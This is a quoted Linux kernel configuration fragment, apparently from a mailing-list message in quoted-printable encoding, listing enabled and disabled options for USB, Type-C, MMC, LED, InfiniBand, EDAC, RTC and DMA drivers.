> CONFIG_USB_PRINTER=3Dy
> CONFIG_USB_WDM=3Dy
> CONFIG_USB_TMC=3Dy
>=20
> #
> # NOTE: USB_STORAGE depends on SCSI but BLK_DEV_SD may also be needed; se=
e USB_STORAGE Help for more info
> #
> CONFIG_USB_STORAGE=3Dy
> # CONFIG_USB_STORAGE_DEBUG is not set
> CONFIG_USB_STORAGE_REALTEK=3Dy
> CONFIG_REALTEK_AUTOPM=3Dy
> CONFIG_USB_STORAGE_DATAFAB=3Dy
> CONFIG_USB_STORAGE_FREECOM=3Dy
> CONFIG_USB_STORAGE_ISD200=3Dy
> CONFIG_USB_STORAGE_USBAT=3Dy
> CONFIG_USB_STORAGE_SDDR09=3Dy
> CONFIG_USB_STORAGE_SDDR55=3Dy
> CONFIG_USB_STORAGE_JUMPSHOT=3Dy
> CONFIG_USB_STORAGE_ALAUDA=3Dy
> CONFIG_USB_STORAGE_ONETOUCH=3Dy
> CONFIG_USB_STORAGE_KARMA=3Dy
> CONFIG_USB_STORAGE_CYPRESS_ATACB=3Dy
> CONFIG_USB_STORAGE_ENE_UB6250=3Dy
> CONFIG_USB_UAS=3Dy
>=20
> #
> # USB Imaging devices
> #
> CONFIG_USB_MDC800=3Dy
> CONFIG_USB_MICROTEK=3Dy
> CONFIG_USBIP_CORE=3Dy
> CONFIG_USBIP_VHCI_HCD=3Dy
> CONFIG_USBIP_VHCI_HC_PORTS=3D8
> CONFIG_USBIP_VHCI_NR_HCS=3D16
> CONFIG_USBIP_HOST=3Dy
> CONFIG_USBIP_VUDC=3Dy
> # CONFIG_USBIP_DEBUG is not set
>=20
> #
> # USB dual-mode controller drivers
> #
> CONFIG_USB_CDNS_SUPPORT=3Dy
> CONFIG_USB_CDNS_HOST=3Dy
> CONFIG_USB_CDNS3=3Dy
> CONFIG_USB_CDNS3_GADGET=3Dy
> CONFIG_USB_CDNS3_HOST=3Dy
> CONFIG_USB_CDNS3_PCI_WRAP=3Dy
> CONFIG_USB_CDNSP_PCI=3Dy
> CONFIG_USB_CDNSP_GADGET=3Dy
> CONFIG_USB_CDNSP_HOST=3Dy
> CONFIG_USB_MUSB_HDRC=3Dy
> # CONFIG_USB_MUSB_HOST is not set
> # CONFIG_USB_MUSB_GADGET is not set
> CONFIG_USB_MUSB_DUAL_ROLE=3Dy
>=20
> #
> # Platform Glue Layer
> #
>=20
> #
> # MUSB DMA mode
> #
> CONFIG_MUSB_PIO_ONLY=3Dy
> CONFIG_USB_DWC3=3Dy
> CONFIG_USB_DWC3_ULPI=3Dy
> # CONFIG_USB_DWC3_HOST is not set
> CONFIG_USB_DWC3_GADGET=3Dy
> # CONFIG_USB_DWC3_DUAL_ROLE is not set
>=20
> #
> # Platform Glue Driver Support
> #
> CONFIG_USB_DWC3_PCI=3Dy
> CONFIG_USB_DWC3_HAPS=3Dy
> CONFIG_USB_DWC3_OF_SIMPLE=3Dy
> CONFIG_USB_DWC3_GENERIC_PLAT=3Dy
> # CONFIG_USB_DWC3_GOOGLE is not set
> CONFIG_USB_DWC2=3Dy
> CONFIG_USB_DWC2_HOST=3Dy
>=20
> #
> # Gadget/Dual-role mode requires USB Gadget support to be enabled
> #
> # CONFIG_USB_DWC2_PERIPHERAL is not set
> # CONFIG_USB_DWC2_DUAL_ROLE is not set
> CONFIG_USB_DWC2_PCI=3Dy
> # CONFIG_USB_DWC2_DEBUG is not set
> # CONFIG_USB_DWC2_TRACK_MISSED_SOFS is not set
> CONFIG_USB_CHIPIDEA=3Dy
> CONFIG_USB_CHIPIDEA_UDC=3Dy
> CONFIG_USB_CHIPIDEA_HOST=3Dy
> CONFIG_USB_CHIPIDEA_PCI=3Dy
> CONFIG_USB_CHIPIDEA_MSM=3Dy
> CONFIG_USB_CHIPIDEA_NPCM=3Dy
> # CONFIG_USB_CHIPIDEA_IMX is not set
> CONFIG_USB_CHIPIDEA_GENERIC=3Dy
> # CONFIG_USB_CHIPIDEA_TEGRA is not set
> CONFIG_USB_ISP1760=3Dy
> CONFIG_USB_ISP1760_HCD=3Dy
> CONFIG_USB_ISP1761_UDC=3Dy
> # CONFIG_USB_ISP1760_HOST_ROLE is not set
> # CONFIG_USB_ISP1760_GADGET_ROLE is not set
> CONFIG_USB_ISP1760_DUAL_ROLE=3Dy
>=20
> #
> # USB port drivers
> #
> CONFIG_USB_SERIAL=3Dy
> CONFIG_USB_SERIAL_CONSOLE=3Dy
> CONFIG_USB_SERIAL_GENERIC=3Dy
> CONFIG_USB_SERIAL_SIMPLE=3Dy
> CONFIG_USB_SERIAL_AIRCABLE=3Dy
> CONFIG_USB_SERIAL_ARK3116=3Dy
> CONFIG_USB_SERIAL_BELKIN=3Dy
> CONFIG_USB_SERIAL_CH341=3Dy
> CONFIG_USB_SERIAL_WHITEHEAT=3Dy
> CONFIG_USB_SERIAL_DIGI_ACCELEPORT=3Dy
> CONFIG_USB_SERIAL_CP210X=3Dy
> CONFIG_USB_SERIAL_CYPRESS_M8=3Dy
> CONFIG_USB_SERIAL_EMPEG=3Dy
> CONFIG_USB_SERIAL_FTDI_SIO=3Dy
> CONFIG_USB_SERIAL_VISOR=3Dy
> CONFIG_USB_SERIAL_IPAQ=3Dy
> CONFIG_USB_SERIAL_IR=3Dy
> CONFIG_USB_SERIAL_EDGEPORT=3Dy
> CONFIG_USB_SERIAL_EDGEPORT_TI=3Dy
> CONFIG_USB_SERIAL_F81232=3Dy
> CONFIG_USB_SERIAL_F8153X=3Dy
> CONFIG_USB_SERIAL_GARMIN=3Dy
> CONFIG_USB_SERIAL_IPW=3Dy
> CONFIG_USB_SERIAL_IUU=3Dy
> CONFIG_USB_SERIAL_KEYSPAN_PDA=3Dy
> CONFIG_USB_SERIAL_KEYSPAN=3Dy
> CONFIG_USB_SERIAL_KLSI=3Dy
> CONFIG_USB_SERIAL_KOBIL_SCT=3Dy
> CONFIG_USB_SERIAL_MCT_U232=3Dy
> CONFIG_USB_SERIAL_METRO=3Dy
> CONFIG_USB_SERIAL_MOS7720=3Dy
> CONFIG_USB_SERIAL_MOS7715_PARPORT=3Dy
> CONFIG_USB_SERIAL_MOS7840=3Dy
> CONFIG_USB_SERIAL_MXUPORT=3Dy
> CONFIG_USB_SERIAL_NAVMAN=3Dy
> CONFIG_USB_SERIAL_PL2303=3Dy
> CONFIG_USB_SERIAL_OTI6858=3Dy
> CONFIG_USB_SERIAL_QCAUX=3Dy
> CONFIG_USB_SERIAL_QUALCOMM=3Dy
> CONFIG_USB_SERIAL_SPCP8X5=3Dy
> CONFIG_USB_SERIAL_SAFE=3Dy
> # CONFIG_USB_SERIAL_SAFE_PADDED is not set
> CONFIG_USB_SERIAL_SIERRAWIRELESS=3Dy
> CONFIG_USB_SERIAL_SYMBOL=3Dy
> CONFIG_USB_SERIAL_TI=3Dy
> CONFIG_USB_SERIAL_CYBERJACK=3Dy
> CONFIG_USB_SERIAL_WWAN=3Dy
> CONFIG_USB_SERIAL_OPTION=3Dy
> CONFIG_USB_SERIAL_OMNINET=3Dy
> CONFIG_USB_SERIAL_OPTICON=3Dy
> CONFIG_USB_SERIAL_XSENS_MT=3Dy
> CONFIG_USB_SERIAL_WISHBONE=3Dy
> CONFIG_USB_SERIAL_SSU100=3Dy
> CONFIG_USB_SERIAL_QT2=3Dy
> CONFIG_USB_SERIAL_UPD78F0730=3Dy
> CONFIG_USB_SERIAL_XR=3Dy
> CONFIG_USB_SERIAL_DEBUG=3Dy
>=20
> #
> # USB Miscellaneous drivers
> #
> CONFIG_USB_USS720=3Dy
> CONFIG_USB_EMI62=3Dy
> CONFIG_USB_EMI26=3Dy
> CONFIG_USB_ADUTUX=3Dy
> CONFIG_USB_SEVSEG=3Dy
> CONFIG_USB_LEGOTOWER=3Dy
> CONFIG_USB_LCD=3Dy
> CONFIG_USB_CYPRESS_CY7C63=3Dy
> CONFIG_USB_CYTHERM=3Dy
> CONFIG_USB_IDMOUSE=3Dy
> CONFIG_USB_APPLEDISPLAY=3Dy
> CONFIG_APPLE_MFI_FASTCHARGE=3Dy
> CONFIG_USB_LJCA=3Dy
> # CONFIG_USB_USBIO is not set
> CONFIG_USB_SISUSBVGA=3Dy
> CONFIG_USB_LD=3Dy
> CONFIG_USB_TRANCEVIBRATOR=3Dy
> CONFIG_USB_IOWARRIOR=3Dy
> CONFIG_USB_TEST=3Dy
> CONFIG_USB_EHSET_TEST_FIXTURE=3Dy
> CONFIG_USB_ISIGHTFW=3Dy
> CONFIG_USB_YUREX=3Dy
> CONFIG_USB_EZUSB_FX2=3Dy
> CONFIG_USB_HUB_USB251XB=3Dy
> CONFIG_USB_HSIC_USB3503=3Dy
> CONFIG_USB_HSIC_USB4604=3Dy
> CONFIG_USB_LINK_LAYER_TEST=3Dy
> CONFIG_USB_CHAOSKEY=3Dy
> # CONFIG_USB_ONBOARD_DEV is not set
> CONFIG_USB_ATM=3Dy
> CONFIG_USB_SPEEDTOUCH=3Dy
> CONFIG_USB_CXACRU=3Dy
> CONFIG_USB_UEAGLEATM=3Dy
> CONFIG_USB_XUSBATM=3Dy
>=20
> #
> # USB Physical Layer drivers
> #
> CONFIG_USB_PHY=3Dy
> CONFIG_NOP_USB_XCEIV=3Dy
> CONFIG_TAHVO_USB=3Dy
> CONFIG_TAHVO_USB_HOST_BY_DEFAULT=3Dy
> CONFIG_USB_ISP1301=3Dy
> # end of USB Physical Layer drivers
>=20
> CONFIG_USB_GADGET=3Dy
> # CONFIG_USB_GADGET_DEBUG is not set
> CONFIG_USB_GADGET_DEBUG_FILES=3Dy
> CONFIG_USB_GADGET_DEBUG_FS=3Dy
> CONFIG_USB_GADGET_VBUS_DRAW=3D2
> CONFIG_USB_GADGET_STORAGE_NUM_BUFFERS=3D2
> CONFIG_U_SERIAL_CONSOLE=3Dy
>=20
> #
> # USB Peripheral Controller
> #
> CONFIG_USB_GR_UDC=3Dy
> CONFIG_USB_R8A66597=3Dy
> CONFIG_USB_PXA27X=3Dy
> CONFIG_USB_SNP_CORE=3Dy
> # CONFIG_USB_SNP_UDC_PLAT is not set
> # CONFIG_USB_M66592 is not set
> CONFIG_USB_BDC_UDC=3Dy
> CONFIG_USB_AMD5536UDC=3Dy
> CONFIG_USB_NET2280=3Dy
> CONFIG_USB_GOKU=3Dy
> CONFIG_USB_EG20T=3Dy
> # CONFIG_USB_GADGET_XILINX is not set
> CONFIG_USB_MAX3420_UDC=3Dy
> CONFIG_USB_CDNS2_UDC=3Dy
> CONFIG_USB_DUMMY_HCD=3Dy
> # end of USB Peripheral Controller
>=20
> CONFIG_USB_LIBCOMPOSITE=3Dy
> CONFIG_USB_F_ACM=3Dy
> CONFIG_USB_F_SS_LB=3Dy
> CONFIG_USB_U_SERIAL=3Dy
> CONFIG_USB_U_ETHER=3Dy
> CONFIG_USB_U_AUDIO=3Dy
> CONFIG_USB_F_SERIAL=3Dy
> CONFIG_USB_F_OBEX=3Dy
> CONFIG_USB_F_NCM=3Dy
> CONFIG_USB_F_ECM=3Dy
> CONFIG_USB_F_PHONET=3Dy
> CONFIG_USB_F_EEM=3Dy
> CONFIG_USB_F_SUBSET=3Dy
> CONFIG_USB_F_RNDIS=3Dy
> CONFIG_USB_F_MASS_STORAGE=3Dy
> CONFIG_USB_F_FS=3Dy
> CONFIG_USB_F_UAC1=3Dy
> CONFIG_USB_F_UAC1_LEGACY=3Dy
> CONFIG_USB_F_UAC2=3Dy
> CONFIG_USB_F_UVC=3Dy
> CONFIG_USB_F_MIDI=3Dy
> CONFIG_USB_F_MIDI2=3Dy
> CONFIG_USB_F_HID=3Dy
> CONFIG_USB_F_PRINTER=3Dy
> CONFIG_USB_F_TCM=3Dy
> CONFIG_USB_CONFIGFS=3Dy
> CONFIG_USB_CONFIGFS_SERIAL=3Dy
> CONFIG_USB_CONFIGFS_ACM=3Dy
> CONFIG_USB_CONFIGFS_OBEX=3Dy
> CONFIG_USB_CONFIGFS_NCM=3Dy
> CONFIG_USB_CONFIGFS_ECM=3Dy
> CONFIG_USB_CONFIGFS_ECM_SUBSET=3Dy
> CONFIG_USB_CONFIGFS_RNDIS=3Dy
> CONFIG_USB_CONFIGFS_EEM=3Dy
> CONFIG_USB_CONFIGFS_PHONET=3Dy
> CONFIG_USB_CONFIGFS_MASS_STORAGE=3Dy
> CONFIG_USB_CONFIGFS_F_LB_SS=3Dy
> CONFIG_USB_CONFIGFS_F_FS=3Dy
> CONFIG_USB_CONFIGFS_F_UAC1=3Dy
> CONFIG_USB_CONFIGFS_F_UAC1_LEGACY=3Dy
> CONFIG_USB_CONFIGFS_F_UAC2=3Dy
> CONFIG_USB_CONFIGFS_F_MIDI=3Dy
> CONFIG_USB_CONFIGFS_F_MIDI2=3Dy
> CONFIG_USB_CONFIGFS_F_HID=3Dy
> CONFIG_USB_CONFIGFS_F_UVC=3Dy
> CONFIG_USB_CONFIGFS_F_PRINTER=3Dy
> CONFIG_USB_CONFIGFS_F_TCM=3Dy
>=20
> #
> # USB Gadget precomposed configurations
> #
> # CONFIG_USB_ZERO is not set
> # CONFIG_USB_AUDIO is not set
> # CONFIG_USB_ETH is not set
> # CONFIG_USB_G_NCM is not set
> CONFIG_USB_GADGETFS=3Dy
> # CONFIG_USB_FUNCTIONFS is not set
> # CONFIG_USB_MASS_STORAGE is not set
> # CONFIG_USB_GADGET_TARGET is not set
> # CONFIG_USB_G_SERIAL is not set
> # CONFIG_USB_MIDI_GADGET is not set
> # CONFIG_USB_G_PRINTER is not set
> # CONFIG_USB_CDC_COMPOSITE is not set
> # CONFIG_USB_G_NOKIA is not set
> # CONFIG_USB_G_ACM_MS is not set
> # CONFIG_USB_G_MULTI is not set
> # CONFIG_USB_G_HID is not set
> # CONFIG_USB_G_DBGP is not set
> # CONFIG_USB_G_WEBCAM is not set
> CONFIG_USB_RAW_GADGET=3Dy
> # end of USB Gadget precomposed configurations
>=20
> CONFIG_TYPEC=3Dy
> CONFIG_TYPEC_TCPM=3Dy
> CONFIG_TYPEC_TCPCI=3Dy
> CONFIG_TYPEC_RT1711H=3Dy
> CONFIG_TYPEC_MT6360=3Dy
> CONFIG_TYPEC_TCPCI_MT6370=3Dy
> CONFIG_TYPEC_TCPCI_MAXIM=3Dy
> CONFIG_TYPEC_FUSB302=3Dy
> CONFIG_TYPEC_WCOVE=3Dy
> CONFIG_TYPEC_UCSI=3Dy
> CONFIG_UCSI_CCG=3Dy
> CONFIG_UCSI_ACPI=3Dy
> CONFIG_UCSI_STM32G0=3Dy
> CONFIG_TYPEC_TPS6598X=3Dy
> CONFIG_TYPEC_ANX7411=3Dy
> CONFIG_TYPEC_RT1719=3Dy
> CONFIG_TYPEC_HD3SS3220=3Dy
> CONFIG_TYPEC_STUSB160X=3Dy
> CONFIG_TYPEC_WUSB3801=3Dy
>=20
> #
> # USB Type-C Multiplexer/DeMultiplexer Switch support
> #
> CONFIG_TYPEC_MUX_FSA4480=3Dy
> CONFIG_TYPEC_MUX_GPIO_SBU=3Dy
> CONFIG_TYPEC_MUX_PI3USB30532=3Dy
> CONFIG_TYPEC_MUX_INTEL_PMC=3Dy
> # CONFIG_TYPEC_MUX_IT5205 is not set
> CONFIG_TYPEC_MUX_NB7VPQ904M=3Dy
> # CONFIG_TYPEC_MUX_PS883X is not set
> CONFIG_TYPEC_MUX_PTN36502=3Dy
> # CONFIG_TYPEC_MUX_TUSB1046 is not set
> CONFIG_TYPEC_MUX_WCD939X_USBSS=3Dy
> # end of USB Type-C Multiplexer/DeMultiplexer Switch support
>=20
> #
> # USB Type-C Alternate Mode drivers
> #
> CONFIG_TYPEC_DP_ALTMODE=3Dy
> CONFIG_TYPEC_NVIDIA_ALTMODE=3Dy
> # CONFIG_TYPEC_TBT_ALTMODE is not set
> # end of USB Type-C Alternate Mode drivers
>=20
> CONFIG_USB_ROLE_SWITCH=3Dy
> CONFIG_USB_ROLES_INTEL_XHCI=3Dy
> CONFIG_MMC=3Dy
> # CONFIG_PWRSEQ_EMMC is not set
> # CONFIG_PWRSEQ_SD8787 is not set
> # CONFIG_PWRSEQ_SIMPLE is not set
> # CONFIG_MMC_BLOCK is not set
> # CONFIG_SDIO_UART is not set
> # CONFIG_MMC_TEST is not set
> # CONFIG_MMC_CRYPTO is not set
>=20
> #
> # MMC/SD/SDIO Host Controller Drivers
> #
> # CONFIG_MMC_DEBUG is not set
> # CONFIG_MMC_SDHCI is not set
> # CONFIG_MMC_WBSD is not set
> # CONFIG_MMC_TIFM_SD is not set
> # CONFIG_MMC_SPI is not set
> # CONFIG_MMC_SDRICOH_CS is not set
> # CONFIG_MMC_CB710 is not set
> # CONFIG_MMC_VIA_SDMMC is not set
> CONFIG_MMC_VUB300=3Dy
> CONFIG_MMC_USHC=3Dy
> # CONFIG_MMC_USDHI6ROL0 is not set
> CONFIG_MMC_REALTEK_USB=3Dy
> # CONFIG_MMC_CQHCI is not set
> # CONFIG_MMC_HSQ is not set
> # CONFIG_MMC_TOSHIBA_PCI is not set
> # CONFIG_MMC_MTK is not set
> # CONFIG_SCSI_UFSHCD is not set
> CONFIG_MEMSTICK=3Dy
> # CONFIG_MEMSTICK_DEBUG is not set
>=20
> #
> # MemoryStick drivers
> #
> # CONFIG_MEMSTICK_UNSAFE_RESUME is not set
> # CONFIG_MSPRO_BLOCK is not set
> # CONFIG_MS_BLOCK is not set
>=20
> #
> # MemoryStick Host Controller Drivers
> #
> # CONFIG_MEMSTICK_TIFM_MS is not set
> # CONFIG_MEMSTICK_JMICRON_38X is not set
> # CONFIG_MEMSTICK_R592 is not set
> CONFIG_MEMSTICK_REALTEK_USB=3Dy
> CONFIG_NEW_LEDS=3Dy
> CONFIG_LEDS_CLASS=3Dy
> # CONFIG_LEDS_CLASS_FLASH is not set
> CONFIG_LEDS_CLASS_MULTICOLOR=3Dy
> # CONFIG_LEDS_BRIGHTNESS_HW_CHANGED is not set
>=20
> #
> # LED drivers
> #
> # CONFIG_LEDS_AN30259A is not set
> # CONFIG_LEDS_APU is not set
> # CONFIG_LEDS_OSRAM_AMS_AS3668 is not set
> # CONFIG_LEDS_AW200XX is not set
> # CONFIG_LEDS_AW2013 is not set
> # CONFIG_LEDS_BCM6328 is not set
> # CONFIG_LEDS_BCM6358 is not set
> # CONFIG_LEDS_CHT_WCOVE is not set
> # CONFIG_LEDS_CR0014114 is not set
> # CONFIG_LEDS_EL15203000 is not set
> # CONFIG_LEDS_LM3530 is not set
> # CONFIG_LEDS_LM3532 is not set
> # CONFIG_LEDS_LM3642 is not set
> # CONFIG_LEDS_LM3692X is not set
> # CONFIG_LEDS_PCA9532 is not set
> # CONFIG_LEDS_GPIO is not set
> # CONFIG_LEDS_LP3944 is not set
> # CONFIG_LEDS_LP3952 is not set
> # CONFIG_LEDS_LP50XX is not set
> # CONFIG_LEDS_LP55XX_COMMON is not set
> # CONFIG_LEDS_LP8860 is not set
> # CONFIG_LEDS_LP8864 is not set
> # CONFIG_LEDS_PCA955X is not set
> # CONFIG_LEDS_PCA963X is not set
> # CONFIG_LEDS_PCA995X is not set
> # CONFIG_LEDS_DAC124S085 is not set
> # CONFIG_LEDS_REGULATOR is not set
> # CONFIG_LEDS_BD2606MVV is not set
> # CONFIG_LEDS_BD2802 is not set
> # CONFIG_LEDS_INTEL_SS4200 is not set
> # CONFIG_LEDS_LT3593 is not set
> # CONFIG_LEDS_TCA6507 is not set
> # CONFIG_LEDS_TLC591XX is not set
> # CONFIG_LEDS_LM355x is not set
> # CONFIG_LEDS_IS31FL319X is not set
> # CONFIG_LEDS_IS31FL32XX is not set
>=20
> #
> # LED driver for blink(1) USB RGB LED is under Special HID drivers (HID_T=
HINGM)
> #
> # CONFIG_LEDS_BLINKM is not set
> # CONFIG_LEDS_SYSCON is not set
> # CONFIG_LEDS_MLXCPLD is not set
> # CONFIG_LEDS_MLXREG is not set
> # CONFIG_LEDS_USER is not set
> # CONFIG_LEDS_NIC78BX is not set
> # CONFIG_LEDS_SPI_BYTE is not set
> # CONFIG_LEDS_LM3697 is not set
> # CONFIG_LEDS_ST1202 is not set
> # CONFIG_LEDS_LGM is not set
>=20
> #
> # Flash and Torch LED drivers
> #
>=20
> #
> # RGB LED drivers
> #
> # CONFIG_LEDS_GROUP_MULTICOLOR is not set
> # CONFIG_LEDS_KTD202X is not set
> # CONFIG_LEDS_LP5812 is not set
> # CONFIG_LEDS_NCP5623 is not set
> # CONFIG_LEDS_MT6370_RGB is not set
>=20
> #
> # LED Triggers
> #
> CONFIG_LEDS_TRIGGERS=3Dy
> # CONFIG_LEDS_TRIGGER_TIMER is not set
> # CONFIG_LEDS_TRIGGER_ONESHOT is not set
> # CONFIG_LEDS_TRIGGER_DISK is not set
> # CONFIG_LEDS_TRIGGER_MTD is not set
> # CONFIG_LEDS_TRIGGER_HEARTBEAT is not set
> # CONFIG_LEDS_TRIGGER_BACKLIGHT is not set
> # CONFIG_LEDS_TRIGGER_CPU is not set
> # CONFIG_LEDS_TRIGGER_ACTIVITY is not set
> # CONFIG_LEDS_TRIGGER_GPIO is not set
> # CONFIG_LEDS_TRIGGER_DEFAULT_ON is not set
>=20
> #
> # iptables trigger is under Netfilter config (LED target)
> #
> # CONFIG_LEDS_TRIGGER_TRANSIENT is not set
> # CONFIG_LEDS_TRIGGER_CAMERA is not set
> # CONFIG_LEDS_TRIGGER_PANIC is not set
> # CONFIG_LEDS_TRIGGER_NETDEV is not set
> # CONFIG_LEDS_TRIGGER_PATTERN is not set
> # CONFIG_LEDS_TRIGGER_TTY is not set
> # CONFIG_LEDS_TRIGGER_INPUT_EVENTS is not set
>=20
> #
> # Simatic LED drivers
> #
> # CONFIG_ACCESSIBILITY is not set
> CONFIG_INFINIBAND=3Dy
> CONFIG_INFINIBAND_USER_MAD=3Dy
> CONFIG_INFINIBAND_USER_ACCESS=3Dy
> CONFIG_INFINIBAND_USER_MEM=3Dy
> CONFIG_INFINIBAND_ON_DEMAND_PAGING=3Dy
> CONFIG_INFINIBAND_ADDR_TRANS=3Dy
> CONFIG_INFINIBAND_ADDR_TRANS_CONFIGFS=3Dy
> CONFIG_INFINIBAND_VIRT_DMA=3Dy
> # CONFIG_INFINIBAND_EFA is not set
> # CONFIG_INFINIBAND_ERDMA is not set
> CONFIG_MLX4_INFINIBAND=3Dy
> # CONFIG_INFINIBAND_MTHCA is not set
> # CONFIG_INFINIBAND_OCRDMA is not set
> # CONFIG_INFINIBAND_USNIC is not set
> # CONFIG_INFINIBAND_VMWARE_PVRDMA is not set
> # CONFIG_INFINIBAND_RDMAVT is not set
> CONFIG_RDMA_RXE=3Dy
> CONFIG_RDMA_SIW=3Dy
> CONFIG_INFINIBAND_IPOIB=3Dy
> CONFIG_INFINIBAND_IPOIB_CM=3Dy
> CONFIG_INFINIBAND_IPOIB_DEBUG=3Dy
> # CONFIG_INFINIBAND_IPOIB_DEBUG_DATA is not set
> CONFIG_INFINIBAND_SRP=3Dy
> # CONFIG_INFINIBAND_SRPT is not set
> CONFIG_INFINIBAND_ISER=3Dy
> CONFIG_INFINIBAND_RTRS=3Dy
> CONFIG_INFINIBAND_RTRS_CLIENT=3Dy
> # CONFIG_INFINIBAND_RTRS_SERVER is not set
> # CONFIG_INFINIBAND_OPA_VNIC is not set
> CONFIG_EDAC_ATOMIC_SCRUB=3Dy
> CONFIG_EDAC_SUPPORT=3Dy
> CONFIG_EDAC=3Dy
> # CONFIG_EDAC_DEBUG is not set
> # CONFIG_EDAC_DECODE_MCE is not set
> # CONFIG_EDAC_SCRUB is not set
> # CONFIG_EDAC_ECS is not set
> # CONFIG_EDAC_MEM_REPAIR is not set
> # CONFIG_EDAC_E752X is not set
> # CONFIG_EDAC_I82975X is not set
> # CONFIG_EDAC_I3000 is not set
> # CONFIG_EDAC_I3200 is not set
> # CONFIG_EDAC_IE31200 is not set
> # CONFIG_EDAC_X38 is not set
> # CONFIG_EDAC_I5400 is not set
> # CONFIG_EDAC_I7CORE is not set
> # CONFIG_EDAC_I5100 is not set
> # CONFIG_EDAC_I7300 is not set
> # CONFIG_EDAC_SBRIDGE is not set
> # CONFIG_EDAC_SKX is not set
> # CONFIG_EDAC_I10NM is not set
> # CONFIG_EDAC_IMH is not set
> # CONFIG_EDAC_PND2 is not set
> # CONFIG_EDAC_IGEN6 is not set
> CONFIG_RTC_LIB=3Dy
> CONFIG_RTC_MC146818_LIB=3Dy
> CONFIG_RTC_CLASS=3Dy
> # CONFIG_RTC_HCTOSYS is not set
> CONFIG_RTC_SYSTOHC=3Dy
> CONFIG_RTC_SYSTOHC_DEVICE=3D"rtc0"
> # CONFIG_RTC_DEBUG is not set
> # CONFIG_RTC_NVMEM is not set
>=20
> #
> # RTC interfaces
> #
> CONFIG_RTC_INTF_SYSFS=3Dy
> CONFIG_RTC_INTF_PROC=3Dy
> CONFIG_RTC_INTF_DEV=3Dy
> # CONFIG_RTC_INTF_DEV_UIE_EMUL is not set
> # CONFIG_RTC_DRV_TEST is not set
>=20
> #
> # I2C RTC drivers
> #
> # CONFIG_RTC_DRV_ABB5ZES3 is not set
> # CONFIG_RTC_DRV_ABEOZ9 is not set
> # CONFIG_RTC_DRV_ABX80X is not set
> # CONFIG_RTC_DRV_DS1307 is not set
> # CONFIG_RTC_DRV_DS1374 is not set
> # CONFIG_RTC_DRV_DS1672 is not set
> # CONFIG_RTC_DRV_HYM8563 is not set
> # CONFIG_RTC_DRV_MAX6900 is not set
> # CONFIG_RTC_DRV_MAX31335 is not set
> # CONFIG_RTC_DRV_NCT3018Y is not set
> # CONFIG_RTC_DRV_RS5C372 is not set
> # CONFIG_RTC_DRV_ISL1208 is not set
> # CONFIG_RTC_DRV_ISL12022 is not set
> # CONFIG_RTC_DRV_ISL12026 is not set
> # CONFIG_RTC_DRV_X1205 is not set
> # CONFIG_RTC_DRV_PCF8523 is not set
> # CONFIG_RTC_DRV_PCF85363 is not set
> # CONFIG_RTC_DRV_PCF8563 is not set
> # CONFIG_RTC_DRV_PCF8583 is not set
> # CONFIG_RTC_DRV_M41T80 is not set
> # CONFIG_RTC_DRV_BQ32K is not set
> # CONFIG_RTC_DRV_TWL4030 is not set
> # CONFIG_RTC_DRV_S35390A is not set
> # CONFIG_RTC_DRV_FM3130 is not set
> # CONFIG_RTC_DRV_RX8010 is not set
> # CONFIG_RTC_DRV_RX8111 is not set
> # CONFIG_RTC_DRV_RX8581 is not set
> # CONFIG_RTC_DRV_RX8025 is not set
> # CONFIG_RTC_DRV_EM3027 is not set
> # CONFIG_RTC_DRV_RV3028 is not set
> # CONFIG_RTC_DRV_RV3032 is not set
> # CONFIG_RTC_DRV_RV8803 is not set
> # CONFIG_RTC_DRV_SD2405AL is not set
> # CONFIG_RTC_DRV_SD3078 is not set
>=20
> #
> # SPI RTC drivers
> #
> # CONFIG_RTC_DRV_M41T93 is not set
> # CONFIG_RTC_DRV_M41T94 is not set
> # CONFIG_RTC_DRV_DS1302 is not set
> # CONFIG_RTC_DRV_DS1305 is not set
> # CONFIG_RTC_DRV_DS1343 is not set
> # CONFIG_RTC_DRV_DS1347 is not set
> # CONFIG_RTC_DRV_DS1390 is not set
> # CONFIG_RTC_DRV_MAX6916 is not set
> # CONFIG_RTC_DRV_R9701 is not set
> # CONFIG_RTC_DRV_RX4581 is not set
> # CONFIG_RTC_DRV_RS5C348 is not set
> # CONFIG_RTC_DRV_MAX6902 is not set
> # CONFIG_RTC_DRV_PCF2123 is not set
> # CONFIG_RTC_DRV_MCP795 is not set
> CONFIG_RTC_I2C_AND_SPI=3Dy
>=20
> #
> # SPI and I2C RTC drivers
> #
> # CONFIG_RTC_DRV_DS3232 is not set
> # CONFIG_RTC_DRV_PCF2127 is not set
> # CONFIG_RTC_DRV_PCF85063 is not set
> # CONFIG_RTC_DRV_RV3029C2 is not set
> # CONFIG_RTC_DRV_RX6110 is not set
>=20
> #
> # Platform RTC drivers
> #
> CONFIG_RTC_DRV_CMOS=3Dy
> # CONFIG_RTC_DRV_DS1286 is not set
> # CONFIG_RTC_DRV_DS1511 is not set
> # CONFIG_RTC_DRV_DS1553 is not set
> # CONFIG_RTC_DRV_DS1685_FAMILY is not set
> # CONFIG_RTC_DRV_DS1742 is not set
> # CONFIG_RTC_DRV_DS2404 is not set
> # CONFIG_RTC_DRV_STK17TA8 is not set
> # CONFIG_RTC_DRV_M48T86 is not set
> # CONFIG_RTC_DRV_M48T35 is not set
> # CONFIG_RTC_DRV_M48T59 is not set
> # CONFIG_RTC_DRV_MSM6242 is not set
> # CONFIG_RTC_DRV_RP5C01 is not set
> # CONFIG_RTC_DRV_ZYNQMP is not set
>=20
> #
> # on-CPU RTC drivers
> #
> # CONFIG_RTC_DRV_CADENCE is not set
> # CONFIG_RTC_DRV_FTRTC010 is not set
> # CONFIG_RTC_DRV_R7301 is not set
> # CONFIG_RTC_DRV_GOLDFISH is not set
>=20
> #
> # HID Sensor RTC drivers
> #
> CONFIG_RTC_DRV_HID_SENSOR_TIME=3Dy
> CONFIG_DMADEVICES=3Dy
> # CONFIG_DMADEVICES_DEBUG is not set
>=20
> #
> # DMA Devices
> #
> CONFIG_DMA_ENGINE=3Dy
> CONFIG_DMA_VIRTUAL_CHANNELS=3Dy
> CONFIG_DMA_ACPI=3Dy
> CONFIG_DMA_OF=3Dy
> # CONFIG_ALTERA_MSGDMA is not set
> # CONFIG_DW_AXI_DMAC is not set
> # CONFIG_FSL_EDMA is not set
> CONFIG_INTEL_IDMA64=3Dy
> # CONFIG_INTEL_IDXD is not set
> # CONFIG_INTEL_IDXD_COMPAT is not set
> CONFIG_INTEL_IOATDMA=3Dy
> # CONFIG_PLX_DMA is not set
> # CONFIG_XILINX_DMA is not set
> # CONFIG_XILINX_XDMA is not set
> # CONFIG_XILINX_ZYNQMP_DPDMA is not set
> # CONFIG_AMD_PTDMA is not set
